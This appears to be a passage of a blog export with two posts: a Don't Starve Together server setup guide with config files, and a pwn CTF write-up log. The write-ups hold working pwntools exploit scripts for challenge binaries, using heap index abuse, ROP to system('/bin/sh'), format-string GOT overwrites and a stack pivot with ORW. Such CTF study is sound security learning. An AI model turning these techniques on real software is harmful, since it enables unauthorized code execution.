[{"title":"DST联机版 服务器搭建","url":"/2022/12/16/DST_Server/","content":"\n# 0x00 前言\n\n近期大件事，三年的疫情管控结束了，全国基本放开，不用做核酸，火车高铁和各种公共场合也不用查看健康码和行程码了；坏消息是🐏🐏🐏😥🐏🐏🐏...\n\n起因是学校提前一个月把我们赶回家，但在家难免有些清闲，忽思与友同戏《饥荒》，然卡顿异常，忍无可忍，不得已自搭服务器与之同乐。~~顺便水篇博客~~\n\n# 0x01 基础搭建\n\n我太懒了，ssh一直的用root登录，建议一定要使用非root用户连接。\n\n这是我的服务器配置，3-4个人感觉问题不大。\n\n![image-20221217184108264](https://files.catbox.moe/bbobla.png)\n\n安装一些依赖项，忘记了，必要时可以百度，接着安装steamcmd，并执行steamcmd.sh\n\n```shell\nmkdir ~/steamcmd\ncd ~/steamcmd\nwget http://media.steampowered.com/installer/steamcmd_linux.tar.gz\ntar -xvzf steamcmd_linux.tar.gz\n\n./steamcmd.sh\nlogin anonymous\nforce_install_dir \"../myDSTserver/\" #修改DST安装路径\napp_update 343050 validate\nquit\n```\n\n启动游戏，点击账号，用户信息里获取用户ID；游戏里获取服务器token\n\n![image-20221217183345589](https://files.catbox.moe/zvjvgk.png)![image-20221217183540810](https://files.catbox.moe/dygskr.png)\n\n之后，可以使用旧存档的文件，或者点击配置服务器，新建一个新的存档文件夹。两种都差不多，我就把旧的存档上传到服务器上，路径是`~/.klei/DoNotStarveTogether/Cluster_1/`，目录结构是这样的\n\n```tex\n├── Cluster_1/\n│    ├── cluster.ini\n│    ├── cluster_token.txt\n│    ├── Caves/\n│    │    ├── server.ini\n│    │    ├── leveldataoverride.lua\n│    │    ├── modoverrides.lua\n│    ├── Master/\n│    │    ├── server.ini\n│    │    ├── leveldataoverride.lua\n│    │    ├── modoverrides.lua\n```\n\n这是一个完整的位面所需要配置的文件\n\n- `cluster_token.txt` 存储的是从 Klei 官网拿到的 token\n- `cluster.ini` 即这个位面的主配置，主要配置游戏模式、游戏人数、服务器名、密码、 steam 组等等\n- `Master/server.ini` 与 `Caves/server.ini` 配置基本相同，主要是世界的端口号和主次世界设置\n- `modoverrides.lua` 配置开启的 mod 的设置\n- `leveldataoverride.lua` 配置这个世界的资源、设置\n\n另外在安装目录中有个 mods 的目录，其中可以添加服务器模组，当然仅仅是安装到服务器上。用不用还是需要看世界中 modoverrides.lua 的设置。\n\n地上世界(洞穴)基础配置文件 leveldataoverride.lua\n\n```lua\nreturn {\n  desc=\"The standard Don't Starve experience.\",\n  hideminimap=false,\n  id=\"SURVIVAL_TOGETHER\",\n  location=\"forest\",\n  max_playlist_position=999,\n  min_playlist_position=0,\n  name=\"Standard Forest\",\n  -- 雕像的数量\n  numrandom_set_pieces=4,\n  override_level_string=false,\n  overrides={\n    -- 资源设置的可选项分别为:\n    ----- \"never\"    无\n    ----- \"rare\"     较少\n    ----- \"default\"  默认\n    ----- \"often\"    较多\n    ----- \"always\"   大量\n\n    -- 全局设置\n    --- 特殊事件\n    ----- \"none\"                 无\n    ----- \"default\"              自动\n    ----- \"crow_carnival\"        盛夏鸦年华\n    ----- \"hallowed_nights\"      万圣之夜\n    ----- \"winters_feast\"        冬季盛宴\n    ----- \"year_of_the_gobbler\"  火鸡之年\n    ----- \"year_of_the_varg\"     座狼之年\n    ----- \"year_of_the_pig\"      猪王之年\n    ----- \"year_of_the_carrat\"   胡萝卜鼠之年\n    ----- \"year_of_the_beefalo\"  皮弗娄牛之年\n    specialevent=\"default\",\n    --- 季节\n    ----- \"noseason\"         无季节\n    ----- \"veryshortseason\"  非常短\n    ----- \"shortseason\"      较短\n    ----- \"default\"          默认长度\n    ----- \"longseason\"       较长\n    ----- \"verylongseason\"   非常长\n    ----- \"random\"           随机长度\n    autumn=\"default\",  --- 秋季, 根据设置天数依次为 5 / 12 / 20 / 30 / 50\n    winter=\"default\",  --- 冬季, 根据设置天数依次为 5 / 10 / 15 / 22 / 40\n    spring=\"default\",  --- 春季, 根据设置天数依次为 5 / 12 / 20 / 30 / 50\n    summer=\"default\",  --- 夏季, 根据设置天数依次为 5 / 10 / 15 / 22 / 40\n    --- 天类型\n    ----- \"default\"    默认\n    ----- \"longday\"    加长白天\n    ----- \"longdusk\"   加长黄昏\n    ----- \"longnight\"  加长黑夜\n    ----- \"noday\"      无白天\n    ----- \"nodusk\"     无黄昏\n    ----- \"nonight\"    无黑夜\n    ----- \"onlyday\"    只有白天\n    ----- \"onlydusk\"   只有黄昏\n    ----- \"onlynight\"  只有黑夜\n    day=\"default\",\n    beefaloheat=\"default\",  --- 野牛发情\n    krampus=\"default\",      --- 坎普斯\n\n    -- 求生者设置\n    --- 额外起始资源\n    ----- \"0\"        总是\n    ----- \"5\"        5 天后\n    ----- \"default\"  10 天后\n    ----- \"15\"       15 天后\n    ----- \"20\"       20 天后\n    ----- \"none\"     从不\n    extrastartingitems=\"default\",\n    seasonalstartingitems=\"default\",    --- 季节起始物品, \"never\" / \"default\"\n    spawnprotection=\"default\",          --- 出生点保护, \"never\" / \"default\" / \"always\"\n    dropeverythingondespawn=\"default\",  --- 退出掉落物品, \"default\" / \"always\"\n    brightmarecreatures=\"default\",      --- 启蒙怪兽数量\n    shadowcreatures=\"default\",          --- 理智怪兽数量\n\n    -- 世界设置\n    --- 石化\n    ----- \"none\"     无\n    ----- \"few\"      慢\n    ----- \"default\"  默认\n    ----- \"many\"     快\n    ----- \"max\"      极快\n    petrification=\"default\",\n    frograin=\"default\",       --- 蛙雨\n    hounds=\"default\",         --- 猎犬来袭频率\n    alternatehunt=\"default\",  --- 追猎惊喜\n    hunt=\"default\",           --- 狩猎\n    lightning=\"default\",      --- 闪电\n    meteorshowers=\"default\",  --- 流星\n    weather=\"default\",        --- 雨\n    wildfires=\"default\",      --- 野火\n\n    -- 资源再生的可选项分别为:\n    ----- \"never\"     从不\n    ----- \"veryslow\"  非常慢\n    ----- \"slow\"      缓慢\n    ----- \"default\"   默认\n    ----- \"fast\"      快速\n    ----- \"veryfast\"  非常快\n\n    -- 资源再生设置\n    regrowth=\"default\",                --- 再生速度\n    deciduoustree_regrowth=\"default\",  --- 桦栗树再生\n    carrots_regrowth=\"default\",        --- 胡萝卜再生\n    evergreen_regrowth=\"default\",      --- 常青树再生\n    flowers_regrowth=\"default\",        --- 花再生\n    moon_tree_regrowth=\"default\",      --- 月树再生\n    saltstack_regrowth=\"default\",      --- 盐矿再生\n    twiggytrees_regrowth=\"default\",    --- 多枝树再生\n\n    -- 生物设置\n    bees_setting=\"default\",      --- 蜜蜂\n    birds=\"default\",             --- 鸟\n    bunnymen_setting=\"default\",  --- 兔人\n    butterfly=\"default\",         --- 蝴蝶\n    catcoons=\"default\",          --- 浣猫\n    gnarwail=\"default\",          --- 一角鲸\n    perd=\"default\",              --- 火鸡\n    grassgekkos=\"default\",       --- 草蜥蜴\n    moles_setting=\"default\",     --- 鼹鼠\n    penguins=\"default\",          --- 企鹅\n    pigs_setting=\"default\",      --- 猪人\n    rabbits_setting=\"default\",   --- 兔子\n    fishschools=\"default\",       --- 鱼群\n    wobsters=\"default\",          --- 龙虾\n\n    -- 敌对生物设置\n    bats_setting=\"default\",     --- 蝙蝠\n    cookiecutters=\"default\",    --- 饼干切割机\n    frogs=\"default\",            --- 青蛙\n    mutated_hounds=\"default\",   --- 恐怖猎犬, \"never\" / \"default\"\n    hound_mounds=\"default\",     --- 猎犬\n    wasps=\"default\",            --- 杀人蜂\n    lureplants=\"default\",       --- 食人花\n    walrus_setting=\"default\",   --- 海象\n    merms=\"default\",            --- 鱼人\n    penguins_moon=\"default\",    --- 月石企鹅, \"never\" / \"default\"\n    mosquitos=\"default\",        --- 蚊子\n    sharks=\"default\",           --- 鲨鱼\n    moon_spider=\"default\",      --- 破碎蜘蛛\n    squid=\"default\",            --- 乌贼\n    spider_warriors=\"default\",  --- 蜘蛛战士, \"never\" / \"default\"\n    spiders_setting=\"default\",  --- 蜘蛛\n\n    -- 巨型生物设置\n    antliontribute=\"default\",    --- 蚁狮\n    bearger=\"default\",           --- 熊獾\n    beequeen=\"default\",          --- 蜂后\n    crabking=\"default\",          --- 帝王蟹\n    deerclops=\"default\",         --- 独眼巨鹿\n    dragonfly=\"default\",         --- 龙蝇\n    eyeofterror=\"default\",       --- 泰拉瑞亚之眼\n    klaus=\"default\",             --- 克劳斯\n    fruitfly=\"default\",          --- 果蝇王\n    malbatross=\"default\",        --- 邪天翁\n    goosemoose=\"default\",        --- 麋鹿鹅\n    deciduousmonster=\"default\",  --- 毒桦栗树\n    spiderqueen=\"default\",       --- 蜘蛛女王\n    liefs=\"default\",             --- 树精守卫\n\n    -- 世界生成中等级分别为:\n    ----- \"never\"      无\n    ----- \"uncommon\"   很少\n    ----- \"rare\"       较少\n    ----- \"default\"    默认\n    ----- \"often\"      较多\n    ----- \"mostly\"     很多\n    ----- \"always\"     大量\n    ----- \"insane\"     疯狂\n\n    -- 全局生成\n    --- 起始季节\n    ----- \"default\"                      秋\n    ----- \"winter\"                       冬\n    ----- \"spring\"                       春\n    ----- \"summer\"                       夏\n    ----- \"autumn|spring\"                秋或春\n    ----- \"winter|summer\"                冬或夏\n    ----- \"autumn|winter|spring|summer\"  随机\n    season_start=\"default\",\n\n    -- 世界生成\n    --- 生物群落\n    ----- \"default\"  联机版\n    ----- \"classic\"  经典\n    task_set=\"default\",\n    --- 出生点\n    ----- \"plus\"      额外资源\n    ----- \"darkness\"  黑暗\n    ----- \"default\"   默认\n    start_location=\"default\",\n    world_size=\"default\",  --- 世界大小, \"small\" / \"medium\" / \"default\" / \"huge\"\n    --- 世界分支\n    ----- \"never\"    从不\n    ----- \"least\"    少\n    ----- \"default\"  默认\n    ----- \"most\"     多\n    ----- \"random\"   随机\n    branching=\"default\",\n    loop=\"default\",               --- 环形世界, \"never\" / \"default\" / \"always\"\n    touchstone=\"default\",         --- 试金石\n    boons=\"default\",              --- 前辈\n    prefabswaps_start=\"default\",  --- 初始资源多样化, \"classic\" / \"default\" / \"random\"\n    moon_fissure=\"default\",       --- 天体裂隙\n    terrariumchest=\"default\",     --- 泰拉瑞亚, \"never\" / \"default\"\n    roads=\"default\",              --- 道路, \"never\" / \"default\"\n    wormhole_prefab=\"wormhole\",   --- 虫洞多样性, \"wormhole\" (虫洞) / \"tentacle_pillar\" (巨大触手)\n\n    -- 资源\n    moon_starfish=\"default\",         --- 海星\n    moon_bullkelp=\"default\",         --- 公牛海带茎\n    berrybush=\"default\",             --- 浆果从\n    rock=\"default\",                  --- 岩石\n    ocean_bullkelp=\"default\",        --- 公牛海带\n    cactus=\"default\",                --- 仙人掌\n    carrot=\"default\",                --- 胡萝卜\n    flint=\"default\",                 --- 燧石\n    flowers=\"default\",               --- 花\n    grass=\"default\",                 --- 草\n    moon_hotspring=\"default\",        --- 温泉\n    moon_rock=\"default\",             --- 月亮石\n    moon_sapling=\"default\",          --- 月亮树苗\n    moon_tree=\"default\",             --- 月树\n    meteorspawner=\"default\",         --- 流星区\n    rock_ice=\"default\",              --- 迷你冰川\n    mushroom=\"default\",              --- 蘑菇\n    ponds=\"default\",                 --- 池塘\n    reeds=\"default\",                 --- 芦苇\n    sapling=\"default\",               --- 小树苗\n    ocean_seastack=\"ocean_default\",  --- 海矿, 参数需要加 \"ocean_\" 前缀\n    marshbush=\"default\",             --- 荆棘树枝\n    moon_berrybush=\"default\",        --- 石果树\n    trees=\"default\",                 --- 树 (所有)\n    tumbleweed=\"default\",            --- 风滚草\n\n    -- 生物及刷新点\n    bees=\"default\",               --- 蜂巢\n    beefalo=\"default\",            --- 皮弗娄牛\n    buzzard=\"default\",            --- 秃鸠\n    moon_carrot=\"default\",        --- 胡萝卜鼠\n    catcoon=\"default\",            --- 猫桩\n    moles=\"default\",              --- 鼹鼠洞\n    pigs=\"default\",               --- 猪人房\n    rabbits=\"default\",            --- 兔子洞\n    moon_fruitdragon=\"default\",   --- 沙拉蝾螈\n    ocean_shoal=\"default\",        --- 鱼群\n    lightninggoat=\"default\",      --- 伏特羊\n    ocean_wobsterden=\"default\",   --- 龙虾窝\n\n    -- 敌对生物及刷新点\n    chess=\"default\",                   --- 发条装置\n    houndmound=\"default\",              --- 猎犬冢\n    angrybees=\"default\",               --- 杀人蜂巢\n    merm=\"default\",                    --- 漏雨的小屋\n    walrus=\"default\",                  --- 海象营地\n    ocean_waterplant=\"ocean_default\",  --- 海草\n    moon_spiders=\"default\",            --- 破碎蜘蛛洞\n    spiders=\"default\",                 --- 蜘蛛巢\n    tallbirds=\"default\",               --- 高脚鸟巢\n    tentacles=\"default\",               --- 触手\n\n    --- Other\n    has_ocean=true,\n    keep_disconnected_tiles=true,\n    layout_mode=\"LinkNodesByKeys\",\n    no_joining_islands=true,\n    no_wormholes_to_disconnected_tiles=true\n  },\n  random_set_pieces={r\n    \"Sculptures_2\",\n    \"Sculptures_3\",\n    \"Sculptures_4\",\n    \"Sculptures_5\",\n    \"Chessy_1\",      -- 2发条骑士，2齿轮，长矛，棋盘地皮\n    \"Chessy_2\",      -- 2发条主教，棋盘、牛毛地皮，Maxwell 雕像，(2齿轮)\n    \"Chessy_3\",      -- 发条战车，蜂蜜药膏，背包，棋盘、牛毛地皮\n    \"Chessy_4\",      -- 发条战车，2大理石，鹤嘴锄，2大理石柱，1大理石树，棋盘、牛毛地皮，Maxwell 雕像\n    \"Chessy_5\",      -- 1发条骑士，1发条主教，竖琴雕像，棋盘、牛毛地皮\n    \"Chessy_6\",      -- 1发条骑士，1发条主教，棋盘、牛毛地皮\n    \"Maxwell1\",      -- 1发条战车，3发条骑士，棋盘、牛毛地皮，4大理石柱，9大理石树，大量恶魔花\n    \"Maxwell2\",      -- 1发条战车，4发条骑士，棋盘、牛毛地皮，8大理石树，Maxwell 雕像\n    \"Maxwell3\",      -- 5发条骑士，棋盘、牛毛地皮，Maxwell 雕像\n    \"Maxwell4\",      -- 棋盘、牛毛地皮，8大理石树，Maxwell 雕像\n    \"Maxwell5\",      -- 1发条骑士，牛毛地皮，8竖琴雕像，Maxwell 雕像，少量恶魔花\n    \"Maxwell6\",      -- 5大理石树，牛毛地皮\n    \"Maxwell7\",      -- 2发条骑士，棋盘、牛毛地皮，4大理石树，Maxwell 雕像，少量恶魔花\n    \"Warzone_1\",\n    \"Warzone_2\",\n    \"Warzone_3\"\n  },\n  required_prefabs={ \"multiplayer_portal\" },\n  -- 必须包含的雕像种类，而非随机生成。这里指定必须生成完整的三棋子雕像\n  required_setpieces={ \"Sculptures_1\" },\n  settings_desc=\"The standard Don't Starve experience.\",\n  settings_id=\"SURVIVAL_TOGETHER\",\n  settings_name=\"Standard Forest\",\n  substitutes={  },\n  version=4,\n  worldgen_desc=\"The standard Don't Starve experience.\",\n  worldgen_id=\"SURVIVAL_TOGETHER\",\n  worldgen_name=\"Standard Forest\"\n}\n\n```\n\n根目录下的`cluster.ini`\n\n```python\n[GAMEPLAY]\nmax_players = 6                    # 最大游戏人数\npvp = true                         # 能不能攻击其他玩家，能不能给其他玩家喂屎\ngame_mode = survival               # 游戏模式，可选 survival, endless or wilderness，与玩家死亡后的负面影响有关\npause_when_empty = false           # 没人服务器暂停，刷天数必备\nvote_kick_enabled = false          # 投票踢人\n\n[STEAM]\nsteam_group_only = false           # 只允许某 Steam 组的成员加入\nsteam_group_id = 0                 # 指定某个 Steam 组，填写组 ID\nsteam_group_admins = false         # 开启后，Steam 组的管理员拥有服务器的管理权限\n\n[NETWORK]\ncluster_description = ~            # 游戏房间描述\ncluster_name = ~                   # 游戏房间名称\ncluster_intention = social         # 游戏偏好，可选 cooperative, competitive, social,  madness\ncluster_password =                 # 游戏密码，不设置表示无密码\noffline_server = false             # 是否离线服务器，只有局域网用户能加入，并且所有依赖于 Steam 的任何功能都无效，比如说饰品掉落\ntick_rate = 15                     # 每秒通信次数，越高游戏体验越好，但是会加大服务器负担\nwhitelist_slots = 0                # 为白名单用户保留的游戏位\nlan_only_cluster = false           # 局域网游戏\n\n[MISC]\nconsole_enabled = true             # 是否开启控制台\nmax_snapshots = 6                  # 最大快照数，决定了可回滚的天数\n\n[SHARD]\nshard_enabled = true               # 是否允许地上及洞穴互通，开启洞穴的话必须填true\nbind_ip = 127.0.0.1                # 服务器监听的地址，单服务器搭建填 127.0.0.1，双服务器搭建填0.0.0.0\nmaster_ip = 127.0.0.1              # 主世界服务器的 IP，单服务器搭建填127.0.0.1，双服务器搭建填写服务器的公网IP\nmaster_port = 10889                # 监听 master 服务器的 UDP 端口\ncluster_key = supersecretkey       # 游戏通讯密码，每台服务器必须相同\n```\n\n地上(洞穴)的server.ini\n\n```python\n[NETWORK]\nserver_port = 11000                # 监听的 UDP 端口，只能介于 10998 - 11018 之间，确保每个实例都不相同\n\n[SHARD]\nis_master = true                  # 是否是 master 服务器，只能存在一个 true，其他全是 false\n\n[STEAM]\nmaster_server_port = 27018        # Steam 用的端口，确保每个实例都不相同\nauthentication_port = 8768        # Steam 用的端口，确保每个实例都不相同\n\n[ACCOUNT]\nencode_user_path = true\n```\n\n这些配置文件可根据自己的需求设置。最后执行脚本启动服务即可。\n\n```shell\n#!/bin/sh\ncd ~/myDSTserver/bin\nscreen -S \"Don't Starve Together Server\" ./dontstarve_dedicated_server_nullrenderer\n```\n\nctrl a ,ctrl d后台运行，screen -r 恢复\n\n# 0x02 添加服务器mod\n\n无mod，不饥荒。在本地目录可以找到自己的模组，可以先创建世界后，导出配置文件并上传到服务器。这里就不放了，还有更简单的方法，在服务器的DST的mods目录下，有个dedicated\\_server\\_mods\\_setup.lua文件，在里面写入想要更新的mod即可，很方便。下载并安装这些 Mod（如果没有下载的话），并更新到最新版本。\n\n![image-20221217190311944](https://files.catbox.moe/j350t6.png)\n\n接着启动mod，在`~/.klei/DoNotStarveTogether/Cluster_1/Master`目录下，编辑 `modoverrides.lua` 文件保存即可。格式如下：\n\n```lua\nreturn {\n  [\"workshop-797304209\"]={ configuration_options={  }, enabled=true },\n  [\"workshop-806984122\"]={ configuration_options={  }, enabled=true },\n}\n```\n\n饥荒的模组很多，推荐几个比较常用的，服务器模组有显示食物补充值，显示地图队友位置，显示野怪血量，原地复活。\n\n客户端模组有禁止弹出模组信息和Combined Status：显示状态信息，非常实用！\n\n![image-20221217190543967](https://files.catbox.moe/1175wj.png)\n\n# 0x03 添加管理员\n\n饥荒的管理员会有特殊操作权限，如果创建者不在而你因为特殊原因要回滚世界 ，就需要被赋予管理员权限才能执行回退世界的操作。\n\n1、首先获取自己的KLEI用户ID，进游戏之后点“账户”即可查看\n\n2、在服务器存档下新建一个文本文档，命名为`adminlist.txt`，将你的KLEI`用户ID`写进去就可以，保存退出。\n\n# 0x04 其他\n\n运行 `dontstarve_dedicated_server_nullrenderer`，还有其他的启动参数。主要参数如下：\n\n| 参数                     | 用法                                                         |\n| :----------------------- | ------------------------------------------------------------ |\n| -persistent_storage_root | 指定存档根目录的位置，必须是绝对目录。默认为 `~/.klei`。     |\n| -conf_dir                | 指定配置文件的目录名。默认为 `DoNotStarveTogether`，和上一个参数拼在一起就是你存档的完整位置了，默认为 `~/.klei/DoNotStarveTogether`，所有的存档都在这里。 |\n| -cluster                 | 指定启动的世界，默认为 `Cluster_1`。服务端启动时会去找 `<persistent_storage_root>/<conf_dir>/<cluster>` 目录下的 `cluster.ini` 这个配置文件，你的世界名称、密码、游戏模式之类的都是在这里配置的（网上有些教程里用的 `setting.ini`，那个是旧版的）。同理，你的存档文件夹也可以不使用类似 `Cluster_X` 的名字，改成其他什么乱七八糟的都可以，只要启动时指定本参数就行了。 |\n| -shard                   | 默认为 `Master`，启动时将此参数指定为 `Cave` 就可以启动洞穴服务器。 |\n\n如果游戏更新后，服务器DST不更新也无法运行，更新步骤如下：\n\n```shell\ncd ~/steamcmd\n./steamcmd.sh\nforce_install_dir ../myDSTserver \nlogin anonymous \napp_update 343050 validate \nquit\n```\n\n# 0x05 小结\n\n这样就可以正常玩耍了，总体还是比较简单的，不需要太多的操作。后期如果还有要改进的地方再继续来更新。\n\n![image-20221227195422183](https://files.catbox.moe/814xew.png)","tags":["DST","GAME"],"categories":["LIFE"]},{"title":"PWN记录_2022","url":"/2022/12/14/Match22/","content":"\n# 前言\n\n决定考研之后几乎就没做过题了，，已经回归菜鸡水平，\n\n希望读研之后能抽空做一做pwn，这篇博客用来记录研究生之后做的题目，，\n\n## 0x00 MTCTF note\n\nlibc-2.31 编辑时，idx可以输入负数，通过非法索引修改到栈的返回地址为system\n\n```c\nint __fastcall sub_4014B6(__int64 a1)\n{\n  int idx; // [rsp+14h] [rbp-Ch]\n  void *buf; // [rsp+18h] [rbp-8h]\n\n  printf(\"Index: \");\n  idx = input();\n  if ( idx > 16 || !*(_QWORD *)(16LL * idx + a1) )\n    return puts(\"Not allowed\");\n  buf = *(void **)(16LL * idx + a1);\n  printf(\"Content: \");\n  return read(0, buf, *(int *)(16LL * idx + a1 + 8));\n}\n```\n\n泄露libc基址，先free7个tcache，free一个unsortedbin，再申请一个小堆块分割unsortedbin，产生last_remainder，在小堆块中残留了libc地址可以打印。\n\n### exp\n\n```python\nio = start()\ndef add(size,con):\n    sla(\"5. leave\",\"1\")\n    sla(\"Size:\",str(size))\n    sa(\"Content:\",con)\n\ndef show(idx):\n    sla(\"5. leave\",\"2\")\n    sla(\"Index:\",str(idx))\n\ndef edit(idx,con):\n    sla(\"5. leave\",\"3\")\n    sla(\"Index:\",str(idx))\n    sa(\"Content:\",con)\n\ndef delete(idx):\n    sla(\"5. leave\",\"4\")\n    sla(\"Index:\",str(idx))\n\nfor i in range(9):\n    add(0x100,\"a\")\nfor i in range(8):\n    delete(i)\nadd(0x10,b'a')\nshow(0)\nlibc_base = l64() - 0x1ecc61\ninfo(hex(libc_base))\n\nbin_sh = libc_base + next(libc.search(b'/bin/sh\\x00'))\nsystem = libc_base + libc.sym['system']\ninfo(\"systme:\" + hex(system))\nog = libc_base + 0xe3b34\npop_rdi = 0x00000000004017b3\nret = 0x000000000040101a\n# rop = p64(0xdeadbeef) + p64(og)\nrop = p64(0) + p64(ret) +p64(pop_rdi) + p64(bin_sh)  + p64(system)\ngdb.attach(io)\nedit(-4,rop)\n\nia()\n```\n\n## 0x01 MTCTF 捉迷藏\n\nlibc-2.27 大量混淆数据，90%没用，重点观察栈中最后一个变量v345，找到相应的循环体\n\n![image-20221112164039689](https://files.catbox.moe/kryyp2.png)\n\n逐层向上找，逆出题目逻辑，最后通过栈溢出覆盖返回地址。\n\n特别记录的一点是，  IDA中如下的代码，HIBYTE(), LOBYTE()的含义似乎有歧义\n\n```c\nHIBYTE(v95) ^= 0x38u;\nLOBYTE(v98) = v98 ^ 0xC6;\n```\n\nIDA中汇编是`mov byte ptr [rbp+var_374+3], al`，即取v95的最高位字节，LOBYTE()即取最低字节，而C/C++中并非如此，test.cpp如下，不知是IDA的反编译问题还是...\n\n```c++\n#include <iostream>\n#include <Windows.h>\nint main()\n{\n\t// i = 10241035(0x009c440b)\n\tint i = 10241035;\n\tWORD ih = HIWORD(i);\t// 取高16位\n\tWORD il = LOWORD(i);\t// 取低16位\n \n\t// result: 9c\n\tstd::cout << std::hex << \"ih: \" << ih << std::endl;\n\t// result: 440b\n\tstd::cout << std::hex << \"il: \" << il << std::endl;\n\t\n\tWORD bh = HIBYTE(i);\t// 取高8位\n\tWORD bl = LOBYTE(i);\t// 取低8位\n\t// result: 44\n\tstd::cout << std::hex << \"ih: \" << bh << std::endl;\n\t// result: b\n\tstd::cout << std::hex << \"il: \" << bl << std::endl;\n\treturn EXIT_SUCCESS;\n}\n```\n\n### exp\n\n```python\nio = start()\ndef f():\n    ret = \"\"\n    v104 = [0] * 42\n    z = \"vkyHujGLvgxKsLsXpFvkLqaOkMVwyHXNKZglNEWOKM\"\n    v104[40] = 0x19\n    v104[32] = 0x92\n    v104[14] = 0xA4\n    v104[22] = 0xE6\n    v104[17] = 0x9A\n    v104[1] = 0x7F\n    v104[38] = 0x15\n    v104[0] = 0x3C\n    v104[31] = 0x34\n    v104[30] = 0x2B\n    v104[10] = 0x89\n    v104[26] = 0x98\n    v104[23] = 0xC6\n    v104[21] = 0x68\n    v104[34] = 0x8F\n    v104[25] = 0x5C\n    v104[12] = 0x5C\n    v104[27] = 0xEB\n    v104[35] = 0x42\n    v104[41] = 0xCC\n    v104[6] = 0x49\n    v104[16] = 0xA8\n    v104[7] = 0xA6\n    v104[29] = 0x4E\n    v104[3] = 0xE2\n    v104[13] = 0x31\n    v104[36] = 0x86\n    v104[11] = 0xA7\n    v104[18] = 0x75\n    v104[5] = 1\n    v104[39] = 0xC5\n    v104[9] = 0x93\n    v104[15] = 0x38\n    v104[24] = 0xC6\n    v104[2] = 0xFC\n    v104[20] = 0xC5\n    v104[19] = 0x23\n    v104[37] = 0xEB\n    v104[28] = 0xE0\n    v104[33] = 0x51\n    v104[4] = 0x59\n\n    for i in range(42):\n            ret += chr(v104[i] ^ ord(z[i]))\n\n    return ret\n\nru('sbAmJLMLWm')\nfor i in range(8):\n    sd(\"1 \")\n\nru('HuEqdjYtuWo')\nsd(\"1\"*51)\n\nru(\"hbsoMdIRWpYRqvfClb\")\nsd(\"1\"*53)\n\nru(\"tfAxpqDQuTCyJw\")\nsd(\"1\"*34)\n\nru(\"UTxqmFvmLy\")\nfor i in range(3):\n    sd(\"1 \")\nsd(\"9254 \")\nsd(\"0 \")\nfor i in range(3):\n    sd(\"1 \")\n\nru(\"LLQPyLAOGJbnm\")\nsd(f())\n\nru(\"gRGKqIlcuj\")\nbackdoor = 0x40132C\npayload = b\"1\" * 0x17 +p64(backdoor) +p64(backdoor) + b\"1\" * (55 - 0x17 - 8-8)\nsd(payload)\nio.interactive()\n```\n\n## 0x02 DASCTF2209 cyberprinter\n\nlibc-2.31 保护全开，通过栈溢出可以泄露出libc基址，难点在于格式化字符串的利用\n\n```c\nread(0, s, 0x80uLL);\nif ( strchr(s, 'p') || strchr(s, 'P') || strchr(s, 'x') || strchr(s, 'X') )\n{\n    puts(\"bad luck\");\n    exit(-1);\n}\nprintf(s);\nputs(\"\\nWhen you left,hope you can go wherever you want!\");\n```\n\n一次fmtstr漏洞的利用，进行地址任意写，无法修改got表，只能寻找libc中可用可修改的函数。\n\n先说本地测试成功的是修改__strlen_avx2()的libc中的got，首先进入puts函数，\n\n![image-20221110210222122](https://files.catbox.moe/3e24eo.png)\n\n发现call \\*ABC\\*+0x9f630@plt，继续步入发现__strlen_avx2()，也就是说修改其指针指向onegadget，即可getshell\n\n![image-20221110210349569](https://files.catbox.moe/qyk5x7.png)\n\n在libc-2.31.so找到puts函数，可以找到plt和got的偏移，构造payload即可。\n\n![image-20220920225653497.png](https://files.catbox.moe/odbnxn.png)\n\n### exp\n\n```python\nio = start()\nsla(\"name?pls..\",\"a\"*23)\nlibc_base = l64() - 0x1ed5c0\ninfo(hex(libc_base))\n# system = libc_base + libc.sym['system']\n# start_main = libc_base + 0x21c87\nog = [0xe3afe,0xe3b01,0xe3b04]\none_gadget = libc_base + og[1]\nlibc_atexit = libc_base + 0x01E8898\nrtld = libc_base + 0x22cf68\nstrlen = libc_base + 0x1EC0A8\ntar = rtld\ninfo(\"target: \" + hex(tar))\ninfo(\"one: \" + hex(one_gadget))\npayload = b\"\"\nwritten_size = 0\noffset = 17\n\nfor i in range(6):\n    size = (one_gadget>>(8*i)) & 0xff\n    if(size > (written_size & 0xff)):\n        payload += '%{0}c%{1}$hhn'.format(size-(written_size&0xff),offset+i).encode()\n        written_size += size - (written_size & 0xff)\n    else:\n        payload += '%{0}c%{1}$hhn'.format((0x100-(written_size&0xff))+size,offset+i).encode()\n        written_size += (0x100 - (written_size&0xff)) + size\n\npayload=payload.ljust(0x48,b'a')\nfor i in range(6):\n    payload += p64(tar+i)\n\n# gdb.attach(io)\nsa(\"so you can't do sth\",payload)\n\nio.interactive()\n```\n\n两次失败的是尝试修改__libc_atexit和rtld_lock_default_lock_recursive\n\nrtld_lock_default_lock_recursive，其定义于sysdeps/nptl/libc-lockP.h中，如下：\n\n```c\n#ifdef SHARED\n...\n# define __rtld_lock_lock_recursive(NAME) \\\nGL(dl_rtld_lock_recursive) (&(NAME).mutex)\n\n# define __rtld_lock_unlock_recursive(NAME) \\\nGL(dl_rtld_unlock_recursive) (&(NAME).mutex)\n```\n\n而__libc_atexit是exit里存在函数指针，不详细记录了，具体逻辑可以在IDA里查看\n\n```c\n RUN_HOOK (__libc_atexit, ());\n```\n\n![image-20221112164122442](https://files.catbox.moe/wue001.png)\n\n但是并没有成功，__libc_atexit甚至都没有改掉，这里挖坑先空着，之后回头解决。\n\n## 0x02 DASCTF2209 appetizer\n\nlibc-2.31 程序开启沙盒和NX，首先通过构造栈帧绕过程序认证，再使用栈迁移加ROP使用ORW读出flag\n\n```python\nio = start()\nsa(\"Let's check your identity\",b'\\x00\\x00Nameless')\nru(b\"Here you are:0x\")\nend = int(rl().strip(b'\\n'),16)\npie = end - 0x4050\nread_plt = pie + elf.plt['read']\nwrite_plt = pie + elf.plt['write']\nputs_plt = pie + elf.plt['puts']\nputs_got = pie + elf.got['puts']\npop_rdi = pie + 0x00000000000014d3\npop_rsi_r15 = pie + 0x00000000000014d1\nret = pie + 0x000000000000101a\nleave_ret = pie + 0x00000000000012d8\ninfo(hex(end))\n\npayload = p64(pop_rdi) + p64(1)+ p64(pop_rsi_r15) + \\\np64(puts_got) + p64(0) + p64(write_plt) +p64(ret)*21 + p64(pie+0x1428)+\\\np64(end-8) + p64(leave_ret)\npayload = payload.ljust(0xf8,b\"\\x00\")\npayload += b\"flag.txt\"\nsa(\"information on it\",payload)\n\n# gdb.attach(io)\nsa(\"Tell me your wish:\",p64(end-8) + p64(leave_ret))\nlibc_base = l64() - 0x84420\ninfo(hex(libc_base))\nopen_= libc_base + 